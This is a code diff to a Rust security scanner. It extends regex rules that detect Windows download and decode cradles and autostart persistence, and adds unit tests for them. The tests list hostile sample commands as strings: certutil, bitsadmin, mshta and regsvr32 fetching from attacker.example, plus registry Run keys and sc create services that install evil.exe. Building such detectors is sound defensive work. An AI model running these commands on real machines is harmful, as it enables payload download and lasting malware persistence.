@@ -31,12 +31,16 @@ pub(crate) static REMOTE_BINARY_PATTERNS: LazyLock<Vec<(&'static str, CompiledPa
             ),
             (
                 "SCRIPT_LOLBIN_REMOTE_DOWNLOAD",
-                // Windows living-off-the-land download/remote-exec cradles,
-                // each anchored on its distinctive argument so a benign use of
-                // the same binary (`certutil -hashfile`, `regsvr32 lib.dll`)
-                // does not match: certutil -urlcache, bitsadmin /transfer,
-                // mshta <url>, regsvr32 /i:<url> or scrobj.dll scriptlet.
-                r"(?i)(\bcertutil\b.*-urlcache|\bbitsadmin\b.*/transfer|\bmshta\b.*https?://|\bregsvr32\b.*(/i:https?://|scrobj\.dll))",
+                // Windows living-off-the-land download/remote-exec/decode
+                // cradles, each anchored on its distinctive argument so a
+                // benign use of the same binary (`certutil -hashfile`,
+                // `regsvr32 lib.dll`, `certutil -decode cert.txt cert.cer`)
+                // does not match: certutil -urlcache; certutil -decode to an
+                // EXECUTABLE output (the Windows `base64 -d` dropper analog,
+                // gated on an exec extension so PKI cert decoding is exempt);
+                // bitsadmin /transfer; mshta <url>; regsvr32 /i:<url> or
+                // scrobj.dll scriptlet.
+                r"(?i)(\bcertutil\b.*-urlcache|\bcertutil\b.*-decode.*\.(exe|dll|scr|bat|cmd|com|ps1|vbs|hta|msi)|\bbitsadmin\b.*/transfer|\bmshta\b.*https?://|\bregsvr32\b.*(/i:https?://|scrobj\.dll))",
             ),
         ])
     });
@@ -59,7 +63,13 @@ pub(crate) static DEFERRED_PATTERNS: LazyLock<Vec<(&'static str, CompiledPattern
             ),
             (
                 "SCRIPT_PERSISTENCE",
-                r"(?i)(/etc/cron|(?:~|\$\{?home\}?)/\.config/autostart|launchagents|startup\\|runonce)",
+                // *nix autostart (cron/autostart/LaunchAgents) plus Windows
+                // autostart: `…\CurrentVersion\Run` registry key (reg add /
+                // New-/Set-ItemProperty, any language — `detect_powershell_
+                // persistence` only covered ps1), the `shell:startup` special
+                // folder, and `sc[.exe] create` service install. `runonce`
+                // already covered the RunOnce key.
+                r"(?i)(/etc/cron|(?:~|\$\{?home\}?)/\.config/autostart|launchagents|startup\\|runonce|currentversion\\run|shell:startup|\bsc(?:\.exe)?\s+create\b)",
             ),
         ])
     },
@@ -232,6 +242,8 @@ mod tests {
     fn lolbin_remote_download_matches_cradles() {
         for input in [
             "certutil -urlcache -f http://attacker.example/p.exe p.exe",
+            "certutil -decode %TEMP%\\stage.b64 %TEMP%\\update.exe",
+            "certutil -decodehex in.hex out.dll",
             "bitsadmin /transfer job http://attacker.example/p.exe c:\\p.exe",
             "mshta https://attacker.example/x.hta",
             "regsvr32 /s /n /u /i:http://attacker.example/x.sct scrobj.dll",
@@ -248,11 +260,13 @@ mod tests {
     }
 
     /// Contract (negative): benign uses of the same LOLBins (no download
-    /// argument) and substring lookalikes must NOT match.
+    /// argument, or a `-decode` to a non-executable cert) and substring
+    /// lookalikes must NOT match.
     #[test]
     fn lolbin_remote_download_rejects_benign_uses() {
         for input in [
             "certutil -hashfile payload.exe SHA256",
+            "certutil -decode somecert.txt cert.cer",
             "regsvr32 /s mylibrary.dll",
             "mycertutil -urlcache -f http://x/y z",
             "echo bitsadmin transfer is a windows tool",
@@ -338,6 +352,41 @@ mod tests {
             ),
             "a non-autostart $HOME path must not match SCRIPT_PERSISTENCE",
         );
+    }
+
+    /// Contract: Windows autostart persistence matches the `CurrentVersion\Run`
+    /// registry key (any language, not just PowerShell), the `shell:startup`
+    /// special folder, and `sc[.exe] create` service install.
+    #[test]
+    fn persistence_matches_windows_autostart_forms() {
+        for input in [
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d C:\\evil.exe /f",
+            "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name X",
+            "copy evil.exe shell:startup",
+            "sc create evilsvc binPath= \"C:\\evil.exe\" start= auto",
+            "sc.exe create x binpath= c:\\e.exe",
+        ] {
+            assert!(
+                matches(&DEFERRED_PATTERNS, "SCRIPT_PERSISTENCE", input),
+                "expected `{input}` to match SCRIPT_PERSISTENCE",
+            );
+        }
+    }
+
+    /// Contract (negative): a build variable like `BINPATH=` and the word
+    /// `create` in prose must NOT trip the Windows service-install clause.
+    #[test]
+    fn persistence_rejects_windows_lookalikes() {
+        for input in [
+            "export BINPATH=/usr/local/bin",
+            "misc creation of the run directory",
+            "this disc create step is documented",
+        ] {
+            assert!(
+                !matches(&DEFERRED_PATTERNS, "SCRIPT_PERSISTENCE", input),
+                "benign text must not match SCRIPT_PERSISTENCE: {input:?}",
+            );
+        }
     }
 
     /// Contract: `COMMAND_INJECTION_SINK_SHELL` matches genuine `bash -c`
